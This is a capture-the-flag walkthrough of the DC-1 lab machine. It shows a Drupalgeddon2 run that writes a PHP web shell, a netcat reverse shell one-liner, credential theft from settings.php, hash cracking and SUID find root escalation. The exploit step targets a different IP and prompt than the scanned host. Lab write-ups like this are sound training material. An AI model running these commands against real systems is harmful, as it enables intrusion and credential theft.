---
layout: default
title: DC-1
parent: Proving Grounds Play
nav_order: 14
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.226.193
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 22:30 EST
Nmap scan report for 192.168.226.193
Host is up (0.063s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35685/udp6  status
|   100024  1          40238/tcp   status
|   100024  1          56691/udp   status
|_  100024  1          58362/tcp6  status
40238/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

## 80 | HTTP

Running Drupo version 7 so we immediately try _Drupalgeddon2_.

# Exploitation

---

Locate the exploit in _searchsploit_

![searchsploit](../../../assets/images/ctfs/proving_grounds/dc-1/searchsploit.png)

Copy the _44449.rb_ exploit to the current directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ searchsploit -m 44449.rb
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/vagrant/Documents/PG/PLAY/dc_1/44449.rb

```

Now we can run the exploit and get a reverse shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ ruby 44449.rb http://192.168.226.48:1898
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.226.48:1898/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.226.48:1898/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo OXGANKQN
[+] Result : OXGANKQN
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.226.48:1898/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.226.48:1898/shell.php' -d 'c=hostname'
lampiao>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Get a Stable Shell

Use _revshellgen_ to generate a _nc-mknod_ reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

Run this one-liner in the PHP shell on the target.

```bash
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!

dc-1>> rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l
[!] WARNING: Detected an known bad character (>)

```

We get a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.226.193] 37736
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Obtain DB User/Password from settings.php

Drupal configuration files are located at _/sites/default/settings.php_

Reading this file we locate some credentials.

```bash
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

DB creds: dbuser:R0ck3t
{: .warn}

## Enumerate Drupaldb

Connect to the _drupaldb_

```bash
www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -pR0ck3t drupaldb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 79
Server version: 5.5.60-0+deb7u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

Use the _drupaldb_ and _users_ table to get hashes for _admin_ and _Fred_

```bash
mysql> select * from users;
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
| uid | name  | pass                                                    | mail              | theme | si
gnature | signature_format | created    | access     | login      | status | timezone            | langu
age | picture | init              | data |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
|   0 |       |                                                         |                   |       |
        | NULL             |          0 |          0 |          0 |      0 | NULL                |
    |       0 |                   | NULL |
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |
    |       0 | admin@example.com | b:0; |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |
    |       0 | fred@example.org  | b:0; |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
3 rows in set (0.00 sec)
```

Add the hashes to a file

![hashes](../../../assets/images/ctfs/proving_grounds/dc-1/hashes.png)

Use _name-that-hash_ to get the hash type _Drupal_ and the JTR command _drupal7_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ nth --file hashes

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR

Most Likely
Drupal > v7.x, HC: 7900 JtR: drupal7


$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg

Most Likely
Drupal > v7.x, HC: 7900 JtR: drupal7

```

Use John to crack the hashes

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc_1]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=drupal7 hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:13 0.13% (ETA: 2023-11-09 03:37) 0g/s 168.1p/s 336.2c/s 336.2C/s vegeta1..tracey1
Session aborted

```

This is ultimately a deadend because the hash is SHA512.

## Check SUID File Permissions

```bash
www-data@DC-1:/var/www/sites/default$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

The _/usr/bin/find_ binary should give us a root shell.

![gtfobins](../../../assets/images/ctfs/proving_grounds/dc-1/gtfobins.png)

We want to run _/usr/bin/find_ on a file we have read permissions on, such as _flag4.txt_

```bash
www-data@DC-1:/home/flag4$ /usr/bin/find flag4.txt -exec /bin/bash -p \; -quit
bash-4.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

```
